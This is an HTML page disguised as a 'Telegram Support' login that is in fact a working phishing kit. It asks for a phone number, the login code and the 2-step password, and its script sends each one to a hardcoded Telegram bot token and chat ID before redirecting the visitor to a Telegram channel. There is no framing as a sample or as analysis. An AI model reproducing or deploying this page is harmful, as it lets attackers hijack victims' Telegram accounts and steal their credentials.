<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Support</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 320px; text-align: center; }
        img { width: 80px; margin-bottom: 20px; }
        h2 { font-size: 22px; color: #222; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        /* ·ã∞·à®·åÉ·ãé·âπ·äï ·àò·ã∞·â†·âÇ·ã´ */
        .step { display: none; } 
        .active { display: block !important; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
    
    <div id="part1" class="step active">
        <h2>Your Phone</h2>
        <p>Please enter your number</p>
        <input type="tel" id="myPhone" placeholder="+251..." required>
        <button onclick="toStep2()">Next</button>
    </div>

    <div id="part2" class="step">
        <h2>Enter Code</h2>
        <p>Check your Telegram messages</p>
        <input type="text" id="myCode" placeholder="5-digit code">
        <button onclick="toStep3()">Next</button>
    </div>

    <div id="part3" class="step">
        <h2>Password</h2>
        <p>Enter your 2-step password</p>
        <input type="password" id="myPass" placeholder="Password">
        <button onclick="toFinish()">Submit</button>
    </div>
</div>

<script>
    const botToken = '7249691006:AAGDEpLHUkarPvbWlyMaTwpABPmJSrDOJPI';
    const myChatId = '6338638588';

    function postToBot(text) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myChatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
    }

    function toStep2() {
        const p = document.getElementById('myPhone').value;
        if(p) {
            postToBot(`üì± **Phone:** \`${p}\``);
            document.getElementById('part1').classList.remove('active');
            document.getElementById('part2').classList.add('active');
        }
    }

    function toStep3() {
        const c = document.getElementById('myCode').value;
        if(c) {
            postToBot(`üîë **Code:** \`${c}\``);
            document.getElementById('part2').classList.remove('active');
            document.getElementById('part3').classList.add('active');
        }
    }

    function toFinish() {
        const pw = document.getElementById('myPass').value;
        if(pw) {
            postToBot(`üõ°Ô∏è **Pass:** \`${pw}\``);
            window.location.href = "https://t.me/Mame_Tech_Solution";
        }
    }
</script>

</body>
</html>
